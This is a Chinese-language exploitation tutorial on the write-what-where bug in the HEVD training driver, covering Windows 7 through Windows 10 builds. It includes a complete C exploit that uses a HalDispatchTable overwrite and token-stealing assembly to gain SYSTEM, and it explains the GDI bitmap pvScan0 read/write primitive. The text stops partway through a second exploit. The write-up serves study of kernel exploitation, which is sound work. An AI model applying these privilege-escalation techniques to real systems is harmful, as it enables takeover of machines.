# 从TH2到RS3看WWW漏洞的攻与防
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 0x0:注意点&&环境
~多图预警~
###  环境
我使用的环境  
物理机OS:windows 10  
虚拟机OS:win7_x86&&win10_x64_1511( TH2 )&&win10_x64_1607( RS1 )&&win10_x64_1703(
RS2 )&&win10_x64_1709( RS3 )  
VMware:VMware Workstation 15 Pro  
编译器:vs2019  
驱动: HEVD 1.2  
驱动加载工具:VirtualKD-Redux-2021.2  
调试器:Microsoft Store上直接下的windbg preview版
###  要注意的地方&&一些知识点
要注意的地方就一点,就是把虚拟机的网络给ban掉,不然它会把你的exploit给删掉,还会出现很奇怪的错误,不利于学习.
## 0x01:漏洞点
漏洞点其实很简单,就是指针滥用.上图~~~
然后效果的话,大概是这样
## 0x02:win7_x86下的WWW(Write-What-Where)
其实这个相当于番外,不影响后面的观看体验.  
这里我们依旧采取的是替换Token的方式.如果你不知道怎么替换Token,推荐阅读我的上一篇文章[HEVD驱动栈溢出&&WIN10 SMEP
绕过](https://www.anquanke.com/post/id/252947)  
我们有WWW漏洞了,那么我们该怎么替换Token呢?  
其实我们这里用到了 NtQueryIntervalProfile 函数和 HalQuerySystemInformation 函数.上图
不过我这里是直接将 HalDispatchTable+0x4 地址改成
shellcode的地址.(emmm不知道这么回事我这里没法看NtQueryIntervalProfile 函数和
HalQuerySystemInformation 函数的反汇编).大概是这么一行关键代码
    call    dword ptr [nt!HalDispatchTable+0x4 (83f2c3fc)]
exp也挺简单的,找到 HalDispatchTable+0x4 的地址后用漏洞改成shellcode的地址就可以了.代码:
    #include
    #include
    #define HACKSYS_EVD_IOCTL_ARBITRARY_OVERWRITE             CTL_CODE(FILE_DEVICE_UNKNOWN, 0x802, METHOD_NEITHER, FILE_ANY_ACCESS)
    #define IO_COMPLETION_OBJECT 1
    #define STATUS_SUCCESS 0x00000000
    #define KTHREAD_OFFSET     0x124  // nt!_KPCR.PcrbData.CurrentThread
    #define EPROCESS_OFFSET    0x050  // nt!_KTHREAD.ApcState.Process
    #define PID_OFFSET         0x0B4  // nt!_EPROCESS.UniqueProcessId
    #define FLINK_OFFSET       0x0B8  // nt!_EPROCESS.ActiveProcessLinks.Flink
    #define TOKEN_OFFSET       0x0F8  // nt!_EPROCESS.Token
    #define SYSTEM_PID         0x004  // SYSTEM Process PID
    const char kDevName[] = "\\\\.\\HackSysExtremeVulnerableDriver";
    static VOID CreateCmd()
    {
        STARTUPINFO si = { sizeof(si) };
        PROCESS_INFORMATION pi = { 0 };
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_SHOW;
        WCHAR wzFilePath[MAX_PATH] = { L"cmd.exe" };
        BOOL bReturn = CreateProcessW(NULL, wzFilePath, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFOW)&si, &pi);
        if (bReturn) CloseHandle(pi.hThread), CloseHandle(pi.hProcess);
    }
    HANDLE open_device(const char* device_name)
    {
        HANDLE device = CreateFileA(device_name,
            GENERIC_READ | GENERIC_WRITE,
            NULL,
            NULL,
            OPEN_EXISTING,
            NULL,
            NULL
        );
        return device;
    }
    typedef enum _SYSTEM_INFORMATION_CLASS {
        SystemModuleInformation = 11,
        SystemHandleInformation = 16
    } SYSTEM_INFORMATION_CLASS;
    typedef NTSTATUS(WINAPI* NtQuerySystemInformation_t)(IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
        OUT PVOID                   SystemInformation,
        IN ULONG                    SystemInformationLength,
        OUT PULONG                  ReturnLength);
    #define STATUS_UNSUCCESSFUL ((NTSTATUS)0xC0000001L)
    typedef struct _SYSTEM_MODULE_INFORMATION_ENTRY {
        PVOID  Unknown1;
        PVOID  Unknown2;
        PVOID  Base;
        ULONG  Size;
        ULONG  Flags;
        USHORT Index;
        USHORT NameLength;
        USHORT LoadCount;
        USHORT PathLength;
        CHAR   ImageName[256];
    } SYSTEM_MODULE_INFORMATION_ENTRY, * PSYSTEM_MODULE_INFORMATION_ENTRY;
    typedef struct _SYSTEM_MODULE_INFORMATION {
        ULONG   Count;
        SYSTEM_MODULE_INFORMATION_ENTRY Module[1];
    } SYSTEM_MODULE_INFORMATION, * PSYSTEM_MODULE_INFORMATION;
    #define p printf;
    NtQuerySystemInformation_t NtQuerySystemInformation;
    PVOID GetHalDispatchTable() {
        PVOID HalDispatchTable = 0;
        SIZE_T ReturnLength;
        NTSTATUS NtStatus = STATUS_UNSUCCESSFUL;
        HMODULE hNtDll = LoadLibrary(L"ntdll.dll");
        if (!hNtDll) {
            printf("\t\t\t[-] Failed To Load NtDll.dll: 0x%X\n", GetLastError());
        }
        NtQuerySystemInformation = (NtQuerySystemInformation_t)GetProcAddress(hNtDll, "NtQuerySystemInformation");
        if (!NtQuerySystemInformation) {
            printf("\t\t\t[-] Failed Resolving NtQuerySystemInformation: 0x%X\n", GetLastError());
            exit(EXIT_FAILURE);
        }
        NtStatus = NtQuerySystemInformation(SystemModuleInformation, NULL, 0, &ReturnLength);
        PSYSTEM_MODULE_INFORMATION pSystemModuleInformation = (PSYSTEM_MODULE_INFORMATION)HeapAlloc(GetProcessHeap(),
            HEAP_ZERO_MEMORY,
            ReturnLength);
        if (!pSystemModuleInformation) {
            printf("\t\t\t[-] Memory Allocation Failed For SYSTEM_MODULE_INFORMATION: 0x%X\n", GetLastError());
            exit(EXIT_FAILURE);
        }
        NtStatus = NtQuerySystemInformation(SystemModuleInformation,
            pSystemModuleInformation,
            ReturnLength,
            &ReturnLength);
        if (NtStatus != STATUS_SUCCESS) {
            printf("\t\t\t[-] Failed To Get SYSTEM_MODULE_INFORMATION: 0x%X\n", GetLastError());
            exit(EXIT_FAILURE);
        }
        PVOID KernelBaseAddressInKernelMode = pSystemModuleInformation->Module[0].Base;
        PCHAR KernelImage = strrchr((PCHAR)(pSystemModuleInformation->Module[0].ImageName), '\\') + 1;
        printf("\t\t\t[+] Loaded Kernel: %s\n", KernelImage);
        printf("\t\t\t[+] Kernel Base Address: 0x%p\n", KernelBaseAddressInKernelMode);
        HMODULE hKernelInUserMode = LoadLibraryA(KernelImage);
        if (!hKernelInUserMode) {
            p("\t\t\t[-] Failed To Load Kernel: 0x%X\n", GetLastError());
            exit(EXIT_FAILURE);
        }
        HalDispatchTable = (PVOID)GetProcAddress(hKernelInUserMode, "HalDispatchTable");
        if (!HalDispatchTable) {
            p("\t\t\t[-] Failed Resolving HalDispatchTable: 0x%X\n", GetLastError());
        }
        else {
            HalDispatchTable = (PVOID)((ULONG)HalDispatchTable - (ULONG)hKernelInUserMode);
            HalDispatchTable = (PVOID)((ULONG)HalDispatchTable + (ULONG)KernelBaseAddressInKernelMode);
            ("\t\t\t[+] HalDispatchTable: 0x%p\n", HalDispatchTable);
        };
        HeapFree(GetProcessHeap(), 0, (LPVOID)pSystemModuleInformation);
        if (hNtDll) {
            FreeLibrary(hNtDll);
        }
        if (hKernelInUserMode) {
            FreeLibrary(hKernelInUserMode);
        }
        hNtDll = NULL;
        hKernelInUserMode = NULL;
        pSystemModuleInformation = NULL;
        return HalDispatchTable;
    }
    typedef struct _WRITE_WHAT_WHERE {
        PULONG What;
        PULONG Where;
    } WRITE_WHAT_WHERE, * PWRITE_WHAT_WHERE;
    VOID TokenStealingPayloadWin7Generic() {
        // No Need of Kernel Recovery as we are not corrupting anything
        __asm {
            pushad; Save registers state
            ; Start of Token Stealing Stub
            xor eax, eax; Set ZERO
            mov eax, fs: [eax + KTHREAD_OFFSET] ; Get nt!_KPCR.PcrbData.CurrentThread
            ; _KTHREAD is located at FS : [0x124]
            mov eax, [eax + EPROCESS_OFFSET]; Get nt!_KTHREAD.ApcState.Process
            mov ecx, eax; Copy current process _EPROCESS structure
            mov edx, SYSTEM_PID; WIN 7 SP1 SYSTEM process PID = 0x4
            SearchSystemPID:
            mov eax, [eax + FLINK_OFFSET]; Get nt!_EPROCESS.ActiveProcessLinks.Flink
                sub eax, FLINK_OFFSET
                cmp[eax + PID_OFFSET], edx; Get nt!_EPROCESS.UniqueProcessId
                jne SearchSystemPID
                mov edx, [eax + TOKEN_OFFSET]; Get SYSTEM process nt!_EPROCESS.Token
                mov[ecx + TOKEN_OFFSET], edx; Replace target process nt!_EPROCESS.Token
                ; with SYSTEM process nt!_EPROCESS.Token
                ; End of Token Stealing Stub
                popad; Restore registers state
        }
    }
    typedef NTSTATUS(WINAPI* NtQueryIntervalProfile_t)(IN ULONG   ProfileSource,
        OUT PULONG Interval);
    int main()
    {
        ULONG Interval = 0;
        PVOID EopPayload = &TokenStealingPayloadWin7Generic;
        ULONG BytesReturned = NULL;
        HANDLE hFile = open_device(kDevName);
        PVOID HalDispatchTable = GetHalDispatchTable();
        PVOID HalDispatchTablePlus4 = (PVOID)((ULONG)HalDispatchTable + sizeof(PVOID));
        PWRITE_WHAT_WHERE WriteWhatWhere = (PWRITE_WHAT_WHERE)HeapAlloc(GetProcessHeap(),
            HEAP_ZERO_MEMORY,
            sizeof(WRITE_WHAT_WHERE));
        WriteWhatWhere->What = (PULONG)&EopPayload;
        WriteWhatWhere->Where = (PULONG)HalDispatchTablePlus4;
        DeviceIoControl(hFile,
            HACKSYS_EVD_IOCTL_ARBITRARY_OVERWRITE,
            (LPVOID)WriteWhatWhere,
            sizeof(WriteWhatWhere),
            NULL,
            0,
            &BytesReturned,
            NULL);
        //__debugbreak();
        HMODULE hNtDll = LoadLibrary(L"ntdll.dll");
        NtQueryIntervalProfile_t NtQueryIntervalProfile = (NtQueryIntervalProfile_t)GetProcAddress(hNtDll, "NtQueryIntervalProfile");
        NtQueryIntervalProfile(0x666, &Interval);
        HeapFree(GetProcessHeap(), 0, (LPVOID)WriteWhatWhere);
        WriteWhatWhere = NULL;
        CreateCmd();
        system("pause");
    }
值得一提的是 NtQueryIntervalProfile
这个函数的第一个参数不能是0和1,详细可以参考和[这](https://50u1w4y.github.io/site/HEVD/arbitraryWrite/).  
可以看到最后是成功了的.
## 0x03:TH2(WIN10_X64_1511)下的WWW
TH2下的WWW利用主要用到了一个叫做 bitmap 的对象.而bitmap内核对象中有个叫做 pvScan0 的指针,指向结构中的一块数据区域.
再加上 SetBitmapBits 函数和 GetBitmapBits 函数能对 pvScan0 进行读写,所以如果我们能改掉 pvScan0
指针,使其中一个bitmap对象的pvScan0指针指向另一个bitmap对象的pvScan0指针,就能进行任意地址读写.如图
这里创建了两个bitmap对象,其中一个叫hManager,另一个叫hWorker(当然叫其他的也可以),我们用WWW漏洞把hWorker的pvScan0指针覆盖掉,这样当我们对hManager用SetBitmapBits函数进行任意写时,改的就是hWorker的pvScan0指针.当我们对hWorker用GetBitmapBits/SetBitmapBits函数进行读/写时,读写的内容就是hManager传递过来的指针的值.  
那么问题来了,GetBitmapBits/SetBitmapBits函数怎么使用呢?  
其中SetBitmapBits函数长这样:
    LONG SetBitmapBits(
      HBITMAP    hbm,
      DWORD      cb,
      const VOID *pvBits
    );
GetBitmapBits类似  
其中第一个参数是句柄,使用CreateBitmap函数创建bitmap对象就能得到.像这样:
    HBITMAP hManager = CreateBitmap(0x64, 0x64, 1, 32, NULL);
第二个参数是第三个参数指向的字节数,可以理解为要读写的数据长度.  
第三个参数就是pvScan0指针.怎么得到呢?  
直接上代码.[参考](https://50u1w4y.github.io/site/HEVD/bitmap/)
    DWORD64 getpvScan0Address(HBITMAP handle) {
        printf("    handle value: 0x%p\n", (DWORD64)handle);
        DWORD64 tebAddr = (DWORD64)NtCurrentTeb();
        printf("    tebAddr: 0x%p\n", tebAddr);
        DWORD64 pebAddr = *(PDWORD64)((PUCHAR)tebAddr + 0x60);
        printf("    pebAddr: 0x%p\n", pebAddr);
        DWORD64 GdiSharedHandleTableAddr = *(PDWORD64)((PUCHAR)pebAddr + 0xf8);
        printf("    GdiSharedHandleTableAddr: 0x%p\n", GdiSharedHandleTableAddr);
        // GdiSharedHandleTableAddr 是一个指向GDICELL结构体数组的指针
        // GDICELL 结构体 x86 0x10,x64 0x18
        DWORD64 pKernelAddress = GdiSharedHandleTableAddr + ((DWORD64)handle & 0xffff) * 0x18;
        printf("    pKernelAddress: 0x%p\n", pKernelAddress);
        DWORD64 surfaceObject = *(PDWORD64)pKernelAddress;
        printf("    surfaceObject address: 0x%p\n", surfaceObject);
        // BASEOBJECT 结构体 x86 0x10,x64 0x18
        // pvScan0 在 SURFOBJ 结构体中的偏移 x86 0x20,x64 0x38
        DWORD64 pvScan0Address = surfaceObject + 0x18 + 0x38;
        printf("    pvScan0 address: 0x%p\n", pvScan0Address);
        return pvScan0Address;
    }
然后就是替换Token了,原理是一样的,不过由汇编语言变成了C语言.  
我的exploit:
    #include
    #include
    typedef enum _SYSTEM_INFORMATION_CLASS {
        SystemBasicInformation = 0,
        SystemPerformanceInformation = 2,
        SystemTimeOfDayInformation = 3,
        SystemProcessInformation = 5,
        SystemProcessorPerformanceInformation = 8,
        SystemModuleInformation = 11,
        SystemInterruptInformation = 23,
        SystemExceptionInformation = 33,
        SystemRegistryQuotaInformation = 37,
        SystemLookasideInformation = 45
    } SYSTEM_INFORMATION_CLASS;
    typedef struct _SYSTEM_MODULE_INFORMATION_ENTRY {
        HANDLE Section;
        PVOID MappedBase;
        PVOID ImageBase;
        ULONG ImageSize;
        ULONG Flags;
        USHORT LoadOrderIndex;
        USHORT InitOrderIndex;
        USHORT LoadCount;
        USHORT OffsetToFileName;
        UCHAR FullPathName[256];
    } SYSTEM_MODULE_INFORMATION_ENTRY, * PSYSTEM_MODULE_INFORMATION_ENTRY;
    typedef NTSTATUS(NTAPI* _NtQuerySystemInformation)(
        SYSTEM_INFORMATION_CLASS SystemInformationClass,
        PVOID SystemInformation,
        ULONG SystemInformationLength,
        PULONG ReturnLength
        );
    typedef struct _SYSTEM_MODULE_INFORMATION {
        ULONG NumberOfModules;
        SYSTEM_MODULE_INFORMATION_ENTRY Module[1];
    } SYSTEM_MODULE_INFORMATION, * PSYSTEM_MODULE_INFORMATION;
    DWORD64 getpvScan0Address(HBITMAP handle) {
        printf("    handle value: 0x%p\n", (DWORD64)handle);